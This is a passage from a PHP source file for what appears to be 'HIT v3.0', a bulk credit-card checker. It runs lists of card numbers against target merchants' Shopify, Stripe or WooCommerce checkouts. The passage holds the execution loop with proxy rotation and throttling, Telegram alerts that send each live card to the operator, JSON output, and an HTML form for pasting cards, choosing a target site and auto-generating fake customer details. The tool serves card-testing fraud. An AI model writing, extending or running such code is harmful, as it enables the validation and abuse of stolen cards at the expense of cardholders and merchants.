    return $result;
}

// ============================================
// EXECUTE CHECKS
// ============================================

$results = [];
$execution_time = 0;

if (!empty($cards) && $site && !isset($customer['error'])) {
    foreach ($cards as $card) {
        $result = performGatewayCheck($card, $customer, $site, $pm, $ua, $ROTATE_PROXY, $debug);
        $results[] = $result;
        
        // Notify via Telegram if enabled
        if ($telegram && method_exists($telegram, 'isEnabled') && $telegram->isEnabled() && $result['success']) {
            $telegram->notifySuccess("💳 HIT SUCCESS\nCard: {$result['card']}\nGateway: {$result['gateway']}\nSite: {$site}");
        }
        
        if (count($cards) > 1) {
            usleep(500000); // 0.5s delay between checks
        }
    }
}

$execution_time = round((microtime(true) - $start_time) * 1000);

// ============================================
// JSON OUTPUT
// ============================================

if ($output_format === 'json') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => !empty($results),
        'count' => count($results),
        'results' => $results,
        'customer_details' => isset($customer['error']) ? null : $customer,
        'proxy_rotation' => $ROTATE_PROXY,
        'proxies_loaded' => $proxy_count,
        'execution_time_ms' => $execution_time,
        'timestamp' => date('Y-m-d H:i:s'),
        'version' => '3.0-advanced'
    ], JSON_PRETTY_PRINT);
    exit;
}

// ============================================
// HTML INTERFACE
// ============================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💳 HIT v3.0 - Advanced Multi-Gateway CC Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #1e293b;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            background: white;
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #4338ca;
            font-size: 32px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .version-badge {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .subtitle { 
            color: #64748b; 
            font-size: 16px; 
            line-height: 1.6;
            margin-bottom: 15px;
        }
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .feature {
            background: #f8fafc;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .feature-icon { font-size: 18px; }
        .card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .card h2 {
            color: #1e293b;
            margin-bottom: 20px;
            font-size: 22px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .form-group { margin-bottom: 20px; }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #334155;
            font-size: 14px;
        }
        label small { font-weight: 400; color: #94a3b8; }
        input, textarea, select {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #6366f1;
        }
        textarea { 
            min-height: 100px; 
            font-family: 'Courier New', monospace;
            resize: vertical;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        .btn {
            background: linear-gradient(135deg, #6366f1, #4338ca);
            color: white;
            padding: 14px 28px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
        }
        .btn-secondary { 
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
        }
        .btn-success {
            background: linear-gradient(135deg, #10b981, #059669);
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
        }
        .alert {
            background: #fef2f2;
            border-left: 4px solid #ef4444;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            color: #991b1b;
            font-weight: 600;
        }
        .alert-info {
            background: #eff6ff;
            border-left-color: #3b82f6;
            color: #1e40af;
        }
        .alert-success {
            background: #ecfdf5;
            border-left-color: #10b981;
            color: #065f46;
        }
        .result-card {
            background: #f8fafc;
            border-left: 4px solid #94a3b8;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            transition: transform 0.2s;
        }
        .result-card:hover { transform: translateX(5px); }
        .result-card.success { 
            border-left-color: #10b981; 
            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
        }
        .result-card.declined { 
            border-left-color: #ef4444; 
            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
        }
        .result-card.error { 
            border-left-color: #f59e0b; 
            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
        }
        .result-header {
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .result-item {
            padding: 8px 0;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            align-items: center;
        }
        .result-item:last-child { border-bottom: none; }
        .result-item strong { color: #475569; }
        .result-item span { 
            text-align: right;
            word-break: break-word;
            max-width: 60%;
        }
        .status-badge {
            display: inline-block;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .status-live { background: #10b981; color: white; }
        .status-declined { background: #ef4444; color: white; }
        .status-detected { background: #3b82f6; color: white; }
        .status-processing { background: #f59e0b; color: white; }
        .status-error { background: #ef4444; color: white; }
        .status-invalid { background: #6b7280; color: white; }
        .status-rate_limited { background: #f97316; color: white; }
        .help-text { 
            font-size: 12px; 
            color: #64748b; 
            margin-top: 5px;
            line-height: 1.4;
        }
        .steps-list {
            background: #f8fafc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 12px;
        }
        .steps-list div {
            padding: 5px 0;
            color: #475569;
        }
        .steps-list div:before {
            content: "→ ";
            color: #6366f1;
            font-weight: bold;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
        }
        .stat-value {
            font-size: 28px;
            font-weight: 800;
            color: #4338ca;
            margin-bottom: 5px;
        }
        .stat-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #cbd5e1;
            transition: .4s;
            border-radius: 24px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        input:checked + .slider {
            background-color: #6366f1;
        }
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        @media (max-width: 768px) { 
            .grid { grid-template-columns: 1fr; }
            .features { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <span>💳</span> 
                HIT - Advanced Multi-Gateway CC Checker
                <span class="version-badge">v3.0 Advanced</span>
            </h1>
            <p class="subtitle">
                <strong>🚀 Powered by autosh.php payment system</strong><br>
                Complete Shopify payment flow • Real payment gateway integration • 50+ gateway detection
                • Advanced proxy rotation • Session management • Analytics
            </p>
            <div class="features">
                <div class="feature"><span class="feature-icon">🛒</span> Shopify Full Flow</div>
                <div class="feature"><span class="feature-icon">💳</span> Stripe Integration</div>
                <div class="feature"><span class="feature-icon">🛍️</span> WooCommerce</div>
                <div class="feature"><span class="feature-icon">🔄</span> <?= $proxy_count ?> Proxies Loaded</div>
                <div class="feature"><span class="feature-icon">⚡</span> Rate Limiting</div>
                <div class="feature"><span class="feature-icon">📊</span> Analytics</div>
            </div>
        </div>
        
        <?php if (!empty($results)): ?>
        <div class="card">
            <h2>📊 Check Results</h2>
            
            <div class="stats-grid">
                <?php
                $live_count = count(array_filter($results, fn($r) => $r['status'] === 'LIVE'));
                $declined_count = count(array_filter($results, fn($r) => $r['status'] === 'DECLINED'));
                $error_count = count(array_filter($results, fn($r) => in_array($r['status'], ['ERROR', 'INVALID'])));
                $avg_time = count($results) > 0 ? array_sum(array_column($results, 'response_time')) / count($results) : 0;
                ?>
                <div class="stat-box">
                    <div class="stat-value"><?= $live_count ?></div>
                    <div class="stat-label">✓ Live</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?= $declined_count ?></div>
                    <div class="stat-label">✗ Declined</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?= $error_count ?></div>
                    <div class="stat-label">⚠ Errors</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?= round($avg_time) ?>ms</div>
                    <div class="stat-label">Avg Time</div>
                </div>
            </div>
            
            <?php foreach ($results as $result): ?>
            <div class="result-card <?= $result['status'] === 'LIVE' ? 'success' : ($result['status'] === 'DECLINED' ? 'declined' : 'error') ?>">
                <div class="result-header">
                    <div>
                        <strong>💳 <?= htmlspecialchars($result['card']) ?></strong>
                        <span style="color: #64748b; font-weight: 400; margin-left: 10px;"><?= htmlspecialchars($result['brand']) ?></span>
                    </div>
                    <span class="status-badge status-<?= strtolower($result['status']) ?>"><?= htmlspecialchars($result['status']) ?></span>
                </div>
                
                <div class="result-item"><strong>🏛️ Gateway:</strong> <span><?= htmlspecialchars($result['gateway']) ?></span></div>
                <div class="result-item"><strong>💬 Message:</strong> <span><?= htmlspecialchars($result['message']) ?></span></div>
                <div class="result-item"><strong>👤 Customer:</strong> <span><?= htmlspecialchars($result['customer']['name']) ?></span></div>
                <div class="result-item"><strong>📧 Email:</strong> <span><?= htmlspecialchars($result['customer']['email']) ?></span></div>
                <div class="result-item"><strong>🌐 Site:</strong> <span><?= htmlspecialchars($result['site']) ?></span></div>
                <div class="result-item"><strong>⏱️ Response Time:</strong> <span><?= $result['response_time'] ?>ms</span></div>
                
                <?php if (isset($result['proxy_used'])): ?>
                <div class="result-item"><strong>🔄 Proxy:</strong> <span><?= htmlspecialchars($result['proxy_used']) ?></span></div>
                <?php endif; ?>
                
                <?php if (isset($result['card_token'])): ?>
                <div class="result-item"><strong>🎫 Token:</strong> <span><?= htmlspecialchars(substr($result['card_token'], 0, 20)) ?>...</span></div>
                <?php endif; ?>
                
                <?php if (isset($result['total_amount'])): ?>
                <div class="result-item"><strong>💰 Total Amount:</strong> <span>$<?= htmlspecialchars($result['total_amount']) ?></span></div>
                <?php endif; ?>
                
                <?php if (isset($result['steps']) && !empty($result['steps'])): ?>
                <div class="steps-list">
                    <strong style="display: block; margin-bottom: 8px;">📋 Processing Steps:</strong>
                    <?php foreach ($result['steps'] as $step): ?>
                    <div><?= htmlspecialchars($step) ?></div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
            </div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
        
        <?php if (isset($customer['error'])): ?>
        <div class="alert">
            ⚠️ <?= htmlspecialchars($customer['error']) ?>
        </div>
        <?php endif; ?>
        
        <div class="card">
            <h2>🚀 Check Credit Cards</h2>
            <div class="alert-success" style="margin-bottom: 20px;">
                <strong>✨ New in v3.0:</strong> Complete Shopify payment flow from autosh.php • Full session management • GraphQL proposal • Multi-step verification • Enhanced Stripe & WooCommerce support
            </div>
            
            <form method="POST" action="" id="checkForm">
                <div class="form-group">
                    <label>💳 Credit Card(s) <small>(Format: number|month|year|cvv, one per line)</small></label>
                    <textarea name="cc" placeholder="4111111111111111|12|2027|123&#10;5555555555554444|06|2026|456" required><?= isset($_POST['cc']) ? htmlspecialchars($_POST['cc']) : '' ?></textarea>
                    <div class="help-text">Enter one or multiple cards. Bulk checking supported with automatic delays.</div>
                </div>
                
                <div class="form-group">
                    <label>🌐 Target Site * <small>(Shopify, Stripe, WooCommerce, etc.)</small></label>
                    <input type="url" name="site" placeholder="https://example.myshopify.com" value="<?= isset($_POST['site']) ? htmlspecialchars($_POST['site']) : '' ?>" required>
                    <div class="help-text">Supports 50+ payment gateways. Shopify sites get full checkout flow.</div>
                </div>
                
                <div style="background: #f8fafc; padding: 25px; border-radius: 12px; margin: 25px 0;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                        <h3 style="margin: 0; color: #1e293b;">📋 Customer Information</h3>
                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer; margin: 0;">
                            <span style="font-size: 13px; color: #64748b;">Auto-Generate</span>
                            <div class="toggle-switch">
                                <input type="checkbox" name="auto_generate" value="1" id="autoGenToggle" <?= (isset($_POST['auto_generate']) && $_POST['auto_generate'] === '1') ? 'checked' : '' ?>>
                                <span class="slider"></span>
                            </div>
                        </label>
                    </div>
                    
                    <div id="manualFields">
                        <div class="grid">
                            <div class="form-group">
                                <label>First Name</label>
                                <input type="text" name="first_name" placeholder="John" value="<?= isset($_POST['first_name']) ? htmlspecialchars($_POST['first_name']) : '' ?>">
                            </div>
                            <div class="form-group">
                                <label>Last Name</label>
                                <input type="text" name="last_name" placeholder="Smith" value="<?= isset($_POST['last_name']) ? htmlspecialchars($_POST['last_name']) : '' ?>">
                            </div>
                            <div class="form-group">
                                <label>Email</label>
                                <input type="email" name="email" placeholder="john@gmail.com" value="<?= isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '' ?>">
                            </div>
                            <div class="form-group">
                                <label>Phone</label>
                                <input type="tel" name="phone" placeholder="+12125551234" value="<?= isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '' ?>">
                            </div>
                        </div>
                        <div class="form-group">
                            <label>Street Address</label>
                            <input type="text" name="street_address" placeholder="350 5th Ave" value="<?= isset($_POST['street_address']) ? htmlspecialchars($_POST['street_address']) : '' ?>">
                        </div>
                        <div class="grid">
                            <div class="form-group">
                                <label>City</label>
                                <input type="text" name="city" placeholder="New York" value="<?= isset($_POST['city']) ? htmlspecialchars($_POST['city']) : '' ?>">
                            </div>
                            <div class="form-group">
                                <label>State</label>
                                <input type="text" name="state" placeholder="NY" value="<?= isset($_POST['state']) ? htmlspecialchars($_POST['state']) : '' ?>">
                            </div>
                            <div class="form-group">
                                <label>Postal Code</label>
                                <input type="text" name="postal_code" placeholder="10118" value="<?= isset($_POST['postal_code']) ? htmlspecialchars($_POST['postal_code']) : '' ?>">
                            </div>
                        </div>
                        <div class="grid">
                            <div class="form-group">
                                <label>Country</label>
                                <select name="country">
                                    <option value="US">United States</option>
                                    <option value="CA">Canada</option>
                                    <option value="GB">United Kingdom</option>
                                    <option value="AU">Australia</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Currency</label>
                                <select name="currency">
                                    <option value="USD">USD</option>
                                    <option value="EUR">EUR</option>
                                    <option value="GBP">GBP</option>
                                    <option value="CAD">CAD</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div id="autoGenMessage" style="display: none; color: #10b981; font-weight: 600; text-align: center; padding: 20px;">
                        ✓ Customer details will be auto-generated using real US addresses
                    </div>
                </div>
                
                <div class="grid">
                    <div class="form-group">
                        <label>🔄 Proxy Rotation</label>
                        <select name="rotate">
                            <option value="1">Enabled (<?= $proxy_count ?> proxies)</option>
                            <option value="0">Disabled</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>📄 Output Format</label>
                        <select name="format">
                            <option value="html">HTML (Visual)</option>
                            <option value="json">JSON (API)</option>
                        </select>
                    </div>
                </div>
                
                <div style="display: flex; gap: 15px; margin-top: 25px; flex-wrap: wrap;">
                    <button type="submit" class="btn">⚡ Check Cards</button>
                    <button type="button" class="btn btn-secondary" onclick="fillTestData()">🧪 Fill Test Data</button>
                    <button type="button" class="btn btn-success" onclick="fillShopifyDemo()">🛒 Shopify Demo</button>
                </div>
            </form>
        </div>
        
        <div class="alert-info">
            <strong>ℹ️ About HIT v3.0 Advanced:</strong><br>
            • Integrated complete autosh.php payment system<br>
            • Shopify: Full checkout flow (cart → token → proposal → payment)<br>
            • Stripe: Direct tokenization with API<br>
            • WooCommerce: Checkout nonce + submission<br>
            • Auto-proxy rotation with rate limiting<br>
            • Session management & token extraction<br>
            • Real-time analytics & Telegram notifications<br>
            • 50+ gateway detection via GatewayDetector
        </div>
    </div>
    
    <script>
        const autoGenToggle = document.getElementById('autoGenToggle');
        const manualFields = document.getElementById('manualFields');
        const autoGenMessage = document.getElementById('autoGenMessage');
        
        autoGenToggle.addEventListener('change', function() {
            if (this.checked) {
                manualFields.style.display = 'none';
                autoGenMessage.style.display = 'block';
                // Remove required attributes
                document.querySelectorAll('#manualFields input').forEach(inp => {
                    inp.removeAttribute('required');
                });
            } else {
                manualFields.style.display = 'block';
                autoGenMessage.style.display = 'none';
            }
        });
        
        // Trigger on page load
        if (autoGenToggle.checked) {
            manualFields.style.display = 'none';
            autoGenMessage.style.display = 'block';
        }
        
        function fillTestData() {
            document.querySelector('[name="cc"]').value = '4111111111111111|12|2027|123';
            document.querySelector('[name="first_name"]').value = 'John';
            document.querySelector('[name="last_name"]').value = 'Smith';
            document.querySelector('[name="email"]').value = 'john.smith@gmail.com';
            document.querySelector('[name="phone"]').value = '+12125551234';
            document.querySelector('[name="street_address"]').value = '350 5th Ave';
            document.querySelector('[name="city"]').value = 'New York';
            document.querySelector('[name="state"]').value = 'NY';
            document.querySelector('[name="postal_code"]').value = '10118';
            document.querySelector('[name="site"]').value = 'https://example.com';
            autoGenToggle.checked = false;
            autoGenToggle.dispatchEvent(new Event('change'));
        }
        
        function fillShopifyDemo() {
            document.querySelector('[name="cc"]').value = '4242424242424242|12|2027|123';
            document.querySelector('[name="site"]').value = 'https://example.myshopify.com';
            autoGenToggle.checked = true;
            autoGenToggle.dispatchEvent(new Event('change'));
        }
    </script>
</body>
</html>
